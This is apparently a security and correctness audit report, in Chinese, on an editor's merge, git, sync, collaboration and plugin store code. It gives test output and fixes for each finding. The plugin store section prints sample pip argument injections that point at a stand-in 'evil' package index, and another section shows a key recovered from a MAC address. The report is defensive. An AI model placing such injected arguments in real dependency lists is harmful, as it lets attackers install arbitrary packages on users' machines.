# 未审计区域专项审计报告

> 范围：`core/git_client.py`、`core/collab.py`、`core/file_merge.py`、`app/sync.py`、
> `ui/plugin_store.py`、`infrastructure/plugin_updater.py`
> 方法：**静态阅读 + Lead 亲自实证**（所有 P0/P1 结论均有真实运行输出）
> 日期：2026-10-12 · 基线：`pytest tests` = 262 passed

---

## 0. 实证状态

上一轮评估中，4 位审计员的会话都因沙箱问题无法执行命令（`SetNamedSecurityInfoW` 在
spawn 阶段失败），报告主体是静态分析。**本次全部实证由 Lead 执行**（Lead 会话的
提权可用），因此本报告的每条 P0/P1 都有原始运行输出。

同时记录本次**未复现**的 2 项怀疑（见 §3），避免下游误采信静态推断。

---

## 1. 结论摘要（按严重度）

| # | 严重度 | 模块 | 结论 | 实证 |
|---|---|---|---|---|
| F1 | 🔴 **P0** | `file_merge` | 三方合并**静默丢失末尾追加行**，却报告 `auto_merged=True` | ✅ 实证 |
| F2 | 🔴 **P0** | `file_merge` | 合并结果**吞掉末尾换行**（即使"自动合并成功"） | ✅ 实证 |
| F3 | 🟠 **P1** | `git_client` | 含空格路径**永远被引号包裹**；非 ASCII 在默认 `quotePath=true` 下被八进制转义 → Git 面板无法处理 | ✅ 实证 |
| F4 | 🟠 **P1** | `git_client` | `find_root` **不支持 git worktree**（`.git` 是文件）→ 返回 `None` | ✅ 实证 |
| F5 | 🟠 **P1** | `sync` | 加密是 **XOR**，密钥来自 **MAC 地址**（`uuid.getnode()`）→ 仅凭 MAC 即可解密；而同步数据**包含 API Key** | ✅ 实证 |
| F6 | 🟠 **P1** | `sync` | `_merge_data` **列表并集导致删除无法传播**（本地删掉的项同步后复活） | ✅ 实证 |
| F7 | 🟠 **P1** | `sync` | 三处落盘（config / history / apply）**全部 `open('w')` 直写**，非原子 → 崩溃可致配置损坏 | ✅ 实证 |
| F8 | 🟠 **P1** | `collab` | `join()` **不设连接超时** → 连不可达主机**永久挂起**；消息**无长度上限** | ✅ 实证（静态引用） |
| F9 | 🟠 **P1** | `plugin_store` | 依赖安装**未过滤**：注册表提供的字符串直接作为 pip 参数（可注入 `--index-url`、`-r`） | ✅ 实证 |
| F10 | 🟠 **P1** | `plugin_store` | 下载**无大小上限**（分块累积到内存后 `b''.join`）；哈希校验**仅在注册表提供 `file_hash` 时**执行 | ✅ 实证 |
| F11 | 🟡 **P2** | `plugin_updater` | `SemVer` 不处理 `1.0.0a1`（无连字符的预发布）与 `v` 前缀 → 更新误判 | ✅ 实证 |
| F12 | 🟡 **P2** | `plugin_store` | `_is_newer_version` 对 `1.0.0` vs `1.0.0-beta` 误判 | ✅ 实证 |
| F13 | 🟡 **P2** | `file_merge` | zip slip **代码无防护**，仅靠 Python 3.11 的 `extractall` 内置 `_sanitize` 兜底 | ✅ 实证（未复现） |
| F14 | 🟡 **P2** | `collab` | JSON 解析失败**静默 pass**；HELLO 含 user_name 广播给所有 peer（信息暴露） | 静态 |
| F15 | 🟡 **P2** | `sync` | `apply_synced_data` 用远端数据直写本地 `keybindings.json` / themes / snippets，**非原子** | ✅ 实证 |

---

## 2. 逐项详述

### 🔴 F1 —— 三方合并静默丢失末尾追加行（P0）

**位置**：`core/file_merge.py:148-191`（`ThreeWayMerger.merge`）

**根因**：合并主循环是 `while i < len(original_lines)` —— **只遍历原始行数**。
任何在 `local` 或 `remote` 中**追加到末尾**的行（`i >= len(original_lines)`）永远不会被处理。
同时 `auto_merged` 只由 `conflicts` 是否为空决定，所以会**报告"自动合并成功"**。

**实证输出**

```
--- 测试1：双方都在末尾追加新行 ---
  original: 'a\nb\n'
  local   : 'a\nb\nLOCAL_NEW\n'
  remote  : 'a\nb\nREMOTE_NEW\n'
  merged  : 'a\nb'                    ← 两边的追加全部丢失
  conflicts: 0, auto_merged=True      ← 却报告成功

--- 测试2：本地末尾追加 + 远程改首行 ---
  merged  : 'REMOTE_A\nb'             ← 本地的 LOCAL_TAIL 丢失

--- 测试3：远程末尾追加 + 本地改首行 ---
  merged  : 'LOCAL_A\nb'              ← 远程的 REMOTE_TAIL 丢失
```

**影响**：这是"外部文件变更合并"路径。用户在编辑器里**在文件末尾追加内容**，
同时外部程序修改了该文件 —— 合并后**用户追加的内容或外部的内容被静默丢弃**，
且 UI 告知"已自动合并"。与上一轮评估发现的 P0-A / P0-B 属同一危险模式：
**静默数据丢失**。

**修法**：
1. 循环上界改为 `max(len(original_lines), max_end(local_changes), max_end(remote_changes))`；
2. 在循环之后补一段"尾部未处理变更"的合并逻辑；
3. 加不变式断言：`merged` 必须包含 local 与 remote 的所有新增行（或记为冲突）。

**回归测试**（必须加，当前 `tests/` 无 `file_merge` 测试）：
```python
# 双方末尾追加 -> merged 必须同时含两侧内容，或 conflicts 非空
r = ThreeWayMerger.merge("a\nb\n", "a\nb\nLOCAL\n", "a\nb\nREMOTE\n")
assert 'LOCAL' in r['merged'] and 'REMOTE' in r['merged'] or r['conflicts']
```

---

### 🔴 F2 —— 合并吞掉末尾换行（P0）

**实证输出**

```
--- 对照组：不相邻改动（既有测试形态） ---
  local:  'LOCAL\nline2\nline3\nline4\n'
  remote: 'line1\nline2\nline3\nREMOTE\n'
  merged: 'LOCAL\nline2\nline3\nREMOTE'      ← 末行换行消失
```

**根因**：`splitlines()` 丢弃末尾换行信息，而返回时用 `'\n'.join(merged_lines)`
不会补回。于是**任何经过合并的文件都会失去末尾换行**（若原本有）。

**影响**：与上一轮评估 P1-1（保存期规范化）叠加，会持续改写用户文件的最后一行；
对 Makefile、某些解析器、以及 Git 的 `\ No newline at end of file` 标记都有影响。

**修法**：记录 `endswith_eol = original.endswith(('\n','\r\n'))`，返回时按此决定是否补换行。

---

### 🟠 F3 —— Git 路径解析无法处理含空格 / 非 ASCII 路径（P1）

**位置**：`core/git_client.py:45-58`（`status()` 用 `line[3:].strip()`）

**实证输出**（真实 git 仓库）

```
--- git 原始 porcelain 输出 ---
   '?? dash-name.txt'
   '?? emoji_😀.txt'          ← core.quotePath=false
   '?? simple.txt'
   '?? "with space.txt"'      ← 含空格：永远加引号
   '?? 中文名字.txt'

--- GitClient.status() 解析结果 ---
   ❌ status=??  解析键='"with space.txt"'
   ✅ status=??  解析键='dash-name.txt'
   ...
  能被 os.path.exists 找到: 4 | 找不到（解析错误）: 1
```

**引号触发条件**（实测）

| 文件名 | `quotePath=true`（git 默认） | `quotePath=false` |
|---|---|---|
| `with space.txt` | `"with space.txt"` | `"with space.txt"` ← **仍加引号** |
| `中文.txt` | `"\344\270\255\346\226\207.txt"` | `中文.txt` |
| `emoji😀.txt` | `"emoji\360\237\230\200.txt"` | `emoji😀.txt` |
| `nor mal 中文.txt` | `"nor mal \344\270\255\346\226\207.txt"` | `"nor mal 中文.txt"` |

**结论**：
- **含空格的路径在任何配置下都会被引号包裹** → 解析出的键带字面引号，`os.path.exists` 失败；
- 非 ASCII 路径在 **git 默认配置**下被八进制转义 → 同样失败。

**影响**：Git 面板无法显示/暂存/提交这些文件的状态。
在中文环境下（路径常含中文、且常含空格）影响面很大。

**修法**：改用 `git status --porcelain -z`（NUL 分隔，**无引号、无转义**）。
已实测验证：
```
-z 原始字节: b'?? emoji\xf0\x9f\x98\x80.txt\x00?? nor mal \xe4\xb8\xad\xe6\x96\x87.txt\x00...'
-z 按 NUL 切分: ['?? emoji😀.txt', '?? nor mal 中文.txt', '?? with space.txt', '?? 中文.txt']
```
注意：`-z` 下**重命名条目**的格式与普通模式不同（`R  new\0old\0`），需一并处理。

---

### 🟠 F4 —— `find_root` 不支持 git worktree（P1）

**位置**：`core/git_client.py:36-43`（只检查 `os.path.isdir(dirpath/.git)`）

**实证输出**

```
  普通仓库的 .git 是目录: True
  worktree 的 .git 是文件: True
  worktree find_root: None  <-- 期望 'C:\...\qc_wt_3ief70xd'
```

**根因**：git worktree 的工作区里 `.git` 是一个**文件**（内容为 `gitdir: /path/to/repo/.git/worktrees/<name>`），
而 `find_root` 只判断 `isdir`。

**影响**：在使用 worktree 的开发流程中，编辑器**完全找不到 Git 根目录** → Git 面板、状态、diff、提交全部不可用。

**修法**：改为 `os.path.exists(os.path.join(dirpath, '.git'))`，
或更稳妥地用 `git rev-parse --show-toplevel` 让 git 自己回答。
同时 `while dirpath != os.path.dirname(dirpath)` 的边界在到达根目录时**不会检查根目录本身**，
应改为检查后再推进。

---

### 🟠 F5 —— 同步加密是 XOR，密钥可从 MAC 复算（P1，安全）

**位置**：`app/sync.py:808-852`

**实证输出**

```
  machine_id = 238166258871524  (uuid.getnode() = MAC)
  key(hex)   = 20fcf2857729ffc2b7a0aeac0815a2c8
  仅凭公开的 MAC 复算密钥即可解密 -> {'ai_api_key': 'sk-SECRET-12345'}
```

**根因**：
```python
def _encrypt_data(self, data):          # docstring 自称"仅混淆，非强加密"
    key = self._get_encryption_key()    # sha256(uuid.getnode())[:16]
    encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(json_str.encode()))

def _get_machine_id(self):
    return str(uuid.getnode())          # MAC 地址
```

**影响**：
1. XOR 是**可破的**（已知明文即可恢复密钥流；这里连已知明文都不需要，密钥直接可算）；
2. 密钥源自 **MAC 地址**——MAC 在局域网内可见、且常出现在日志/截图/硬件信息中；
3. 同步数据里包含 **API Key**（`ai_api_key`）等敏感项，而同步目标可以是
   **GitHub Gist**（若建为 public gist 则直接公开）。

**修法**：
1. 用真正的加密（`cryptography` 的 Fernet / AES-GCM），密钥来自用户口令或系统密钥库；
2. 至少：密钥改为**用户主密码派生**（PBKDF2/scrypt），而非机器指纹；
3. **不要**同步 API Key —— 明确排除敏感字段，或要求用户显式确认；
4. 若坚持"仅混淆"，应把 docstring 与 UI 提示改为明确警告，并禁止同步凭据。

**注意**：`core/secure_storage.py` 已有更强的凭据存储（用 `keyring`），
同步路径**没有**复用它是设计缺陷。

---

### 🟠 F6 —— 列表并集导致删除无法传播（P1）

**位置**：`app/sync.py:789-798`

**实证输出**

```
  本地已删项，同步后 = [{'n': 'keep'}, {'n': 'deleted_locally'}]
  >>> 删除可传播: 否（并集复活）
```

**根因**：`elif isinstance(...) and isinstance(...): # 列表做并集（去重）`
—— 并集语义下**删除永远无法表达**。

**影响**：用户删除的快捷键/主题/代码片段，下次同步会从另一端"复活"。
用户会认为"删除不生效"，反复删除无效。

**修法**：列表同步需要**墓碑（tombstone）**或**版本向量**；
退一步至少用"较新一方整体胜出"而不是并集。

---

### 🟠 F7 —— 同步落盘非原子（P1）

**实证输出**

```
  save_config          open('w')直写=True   os.replace=False mkstemp=False
  _save_history        open('w')直写=True   os.replace=False mkstemp=False
  apply_synced_data    open('w')直写=True   os.replace=False mkstemp=False
```

**位置**：`app/sync.py:198-219`（`save_config`）、`:952-961`（`_save_history`）、
`:857-920`（`apply_synced_data`）

**影响**：写入过程中崩溃/断电 → `data/*.json`、`sync_history.json`、
`keybindings.json`、`snippets.json`、主题文件**半截**；下次启动解析失败被静默忽略
（`_load_config` 走 `except` 回退默认值）→ **用户配置静默丢失**。

与上一轮评估的 P0-4（编辑器保存非原子）同族，且这里的数据是**用户配置**（丢了很难恢复）。

**修法**：统一 `mkstemp` + `flush` + `fsync` + `os.replace`。
项目里已有正确范例：`app/sync.py:566-568`（`_sync_local` 用了 tmp + `os.replace`）——
说明作者知道该怎么做，只是没贯彻。

---

### 🟠 F8 —— 协作 `join()` 无连接超时、消息无长度上限（P1）

**实证（静态引用）**

```
  join 时设置 connect 超时    False
  recv 有超时               1        ← 仅在 accept 循环里
  消息长度上限                 False
  recv 调用点: ['4096', '4096']
```

**位置**：`core/collab.py:134-160`（`join`）、`:107-132` / `:162-179`（两个读循环）

**问题**：
1. `self.sock.connect((host, port))` **没有 `settimeout`** → 连不可达/丢包主机会
   **永久挂起**（走系统默认 TCP 超时，可能数分钟）。`join` 通常由 UI 调用 → **UI 冻结**。
2. 两个读循环都用 `buf += data` 累积且**不设上限**：对端发送无 `\n` 的数据流 →
   `buf` 无限增长 → 内存耗尽。
3. `except Exception: pass`（`:123-124`）静默吞掉 JSON 解析错误 → 协议不匹配时无任何提示。

**修法**：
1. `sock.settimeout(...)`（连接与读都设）；
2. 加消息长度上限（如 1 MB）并在超限时断开；
3. 解析失败至少计数/记录，不要完全静默。

---

### 🟠 F9 —— 依赖安装未过滤，可注入 pip 参数（P1）

**位置**：`ui/plugin_store.py:949-972`（`_install_dependencies`）

**实证输出**

```
  cmd 构造:
    cmd = [sys.executable, '-m', 'pip', 'install']
    cmd.extend(dependencies)          ← 直接拼接，无任何校验
  >>> dependencies 来自注册表，未做任何过滤：
      --index-url http://evil/simple     -> 会作为 pip 参数原样传入
      -r ../../evil.txt                  -> 会作为 pip 参数原样传入
      evil @ http://x/y.zip              -> 会作为 pip 参数原样传入
```

**影响**：注册表（或 MITM 后的注册表）可在 `dependencies` 里放入
`--index-url`、`-r`、或 VCS URL，使 `pip install` **从攻击者控制的源安装任意包**。
`subprocess.run(list)` 本身避免了 shell 注入，但**参数注入**依然成立。

**注意**：插件安装后本来就会执行任意代码，所以严格说这不是提权。
但它**绕过了"下载 → 哈希校验"这道关卡**（依赖包不经任何校验），
且可安装到用户环境之外的位置（`--target` 等）。属"防御纵深缺失"。

**修法**：
1. 白名单校验每个依赖名（`^[A-Za-z0-9._-]+([<>=!~]=?[^;]+)?$`，拒绝以 `-` 开头的项）；
2. 传递 `--` 分隔符：`cmd = [..., 'install', '--'] + deps`（pip 支持）；
3. 安装前向用户明示将要安装的包列表并要求确认。

---

### 🟠 F10 —— 下载无大小上限、哈希校验可选（P1）

**位置**：`ui/plugin_store.py:977-1001`（`_download_bytes`）、`:718-745`（`install_plugin`）

**实证输出**

```
  含大小检查: False
  含哈希校验: False     ← _download_bytes 自身
```

`install_plugin` 中的校验逻辑：
```python
if info.file_hash:                      # ← 只有注册表提供了 hash 才校验
    actual_hash = hashlib.sha256(data).hexdigest()
    if actual_hash.lower() != info.file_hash.lower():
        return (False, "文件哈希校验失败")
```

**问题**：
1. **无大小上限**：`chunks.append(chunk)` 累积后在 `b''.join(chunks)` 一次性分配。
   恶意/错误注册表返回超大响应的直接后果是**内存耗尽 / 进程被 OOM kill**，
   而且发生在哈希校验**之前**。
2. **哈希校验可选**：注册表不提供 `file_hash` 时**完全没有完整性校验**，
   下载内容直接解压安装。而对端是 HTTPS——TLS 保护了传输，
   但**不防"注册表被篡改/上传了恶意包"**。

**修法**：
1. 加 `MAX_DOWNLOAD_BYTES`（如 50 MB）并在 `iter_content` 循环里累计检查；
2. 把 `file_hash` 列为**必需字段**，缺失则拒绝安装（而非静默跳过校验）；
3. 用 `resp.headers.get('Content-Length')` 预检。

---

### 🟡 F11 / F12 —— 版本比较的边界误判（P2）

**F11 实证**（`infrastructure/plugin_updater.py` 的 `SemVer`）

```
  ❌ compare(1.0.0a1, 1.0.0) = 0   期望 -1      ← 无连字符的预发布被当成正式版
  ❌ compare(v1.2.3, 1.2.3) = -1   期望 0       ← 'v' 前缀未剥离
```

**F12 实证**（`ui/plugin_store.py::_is_newer_version`）

```
  ❌ new=1.0.0  old=1.0.0-beta -> False  期望 True   （预发布 -> 正式）
  错误数: 1 / 7
```

**影响**：某些版本号格式下**更新不会被提示**（用户错过修复版本），
或反之产生错误的"可更新"提示。`SemVer` 对 `-` 分隔的预发布处理是**正确的**
（`1.0.0 > 1.0.0-beta`、`rc1 < rc2` 均 OK），只有无连字符形式失效。

**修法**：统一用一个实现；建议直接依赖 `packaging.version.Version`
（`pip`/`setuptools` 已带），它正确处理 PEP 440 全套（含 `a1`、`v` 前缀、`+build`）。

---

### 🟡 F13 —— zip slip 代码无防护，靠运行时兜底

**实证输出**

```
  _extract_plugin 返回: True ''
  系统 TEMP 下是否出现穿越文件: False
  >>> 未复现穿越（extractall 的 Python 版本可能已内置防护）
      Python 版本: 3.11.9
      zipfile.extractall 有内置 _sanitize: True
```

**位置**：`ui/plugin_store.py:1039-1040`（`zf.extractall(extract_dir)`）

注意同一函数**另一个分支是对的**（`:1074-1078` 逐条过滤 `'..' in name or name.startswith('/')`）。
只有"顶层目录名 != 插件名"这个分支走了 `extractall`。

**结论**：在当前 Python 3.11.9 上**未复现**（`ZipFile._sanitize` 内置拦截）。
但代码本身没有防护，属于**依赖运行时兜底**：
- 若将来降级到较老 Python，行为会改变；
- `_sanitize` 只处理 `..` 与绝对路径，不处理**符号链接条目**。

**修法**：把安全分支的过滤逻辑提取成 `_is_safe_zip_member(name)`，
**两个分支都用**；并显式拒绝符号链接条目。

---

### 🟡 F14 / F15 —— 其他

**F14 协作信息暴露（静态）**：`core/collab.py:143-148` 的 `OP_HELLO` 携带
`user_name`，由服务端 `broadcast` 给所有 peer（`:178-179` `user_joined.emit`）。
在**不受信任的网络**里任何人连上即可获知参与者昵称。当前实现只用于局域网协作，
风险有限，但应在文档中说明"仅限可信网络"。

**F15 `apply_synced_data` 非原子（实证）**：见 F7。它将**远端数据**直接写入本地
`keybindings.json` / themes / snippets，且是 `open('w')` 直写。
若同步到一半崩溃，本地配置即损坏。

---

## 3. 明确未复现 / 判定无问题的项（同样重要）

| 怀疑 | 实证结果 |
|---|---|
| **zip slip 路径穿越** | ❌ **未复现** —— Python 3.11.9 的 `extractall` 内置 `_sanitize` 拦截（F13 记录为"缺显式防护"而非"可exploit"） |
| **`_is_newer_version` 对 `1.10` vs `1.9` 误判** | ❌ **未复现** —— 我用字符串比较预测了错误结论；实际实现比较的是**整数列表**，`1.10 > 1.9` **正确**。仅预发布场景有误（F12） |
| **全仓 TLS 证书校验被关闭** | ✅ **不存在** —— `verify=False` / `_create_unverified_context` / `CERT_NONE` / `check_hostname=False` / `urllib3.disable_warnings` **各 0 处** |
| **`FileMergeDetector` 基础功能** | ✅ **正常** —— 首次 `None`、修改后 `modified`、删除后 `deleted` 均正确 |
| **`subprocess` shell 注入** | ✅ **不存在** —— 全仓 `shell=True` 仅 1 处（且不在本次范围）；`plugin_store` 用 list 形式 |

> **方法学记录**：本次我又犯了 1 次静态误判（F12 的 `1.10 vs 1.9`）。
> 这是本次评估中第 4 次"静态推断被实证推翻"，进一步说明铁律的必要性。

---

## 4. 修复优先级

| 顺序 | 任务 | 理由 |
|---|---|---|
| 1 | **F1 + F2**（三方合并） | 静默数据丢失，且当前**无任何测试** |
| 2 | **F3**（git 状态 `-z`） | 影响所有含空格/中文路径，中文环境必然踩到 |
| 3 | **F5**（同步加密/凭据） | 安全；且应改为**不同步 API Key** |
| 4 | **F6 + F7**（同步合并语义 + 原子落盘） | 用户配置可靠性 |
| 5 | **F4**（worktree） | 一行改动，影响 worktree 用户 |
| 6 | **F9 + F10**（依赖白名单 + 下载上限 + 强制哈希） | 防御纵深 |
| 7 | **F8**（协作超时与长度上限） | 防 UI 冻结与内存耗尽 |
| 8 | **F11 + F12**（版本比较统一用 `packaging`） | 更新可靠性 |
| 9 | F13 / F14 / F15 | 顺手清理 |

### 必须补的测试（当前完全缺失）

```python
# file_merge：tests/ 下目前 0 个 file_merge 测试
def test_merge_append_both_sides()      # F1
def test_merge_preserves_trailing_eol() # F2
def test_merge_true_conflict_marks()    # 冲突标记正确性

# git_client
def test_status_parses_quoted_paths()   # F3（含空格 + 中文）
def test_find_root_in_worktree()        # F4

# sync
def test_merge_list_deletion_propagates()   # F6
def test_save_config_is_atomic()            # F7
def test_encryption_not_derivable_from_mac()# F5

# plugin_store
def test_dependency_names_validated()        # F9
def test_download_respects_max_size()        # F10
def test_install_rejects_missing_hash()      # F10
```

---

## 5. 本次审计的局限

1. **未做真实网络联调**：GitHub Gist / WebDAV / 自定义 HTTP 的实盘同步未测试
   （需真实凭据与外网稳定连通性，而本机对境外服务连通性不稳定）。
2. **未做真实协作联调**：`collab` 的两个进程互通未实测（F8 是从代码引用得出）。
3. **未审 `plugin_updater.py` 全文**（1644 行）：本次聚焦版本比较与解压，
   其自动检查调度、更新历史、渠道切换（stable/beta）**未逐行审计**。
4. **未审 `ui/theme_market.py`（775 行）**：与 `plugin_store` 同构，
   推测存在同类问题但**未验证**。
5. **符号链接型 zip slip 未测**：`ZipFile._sanitize` 不处理 symlink 条目，
   我未构造该用例。
6. **`core/snippet_market.py`（130 行）** 未审。
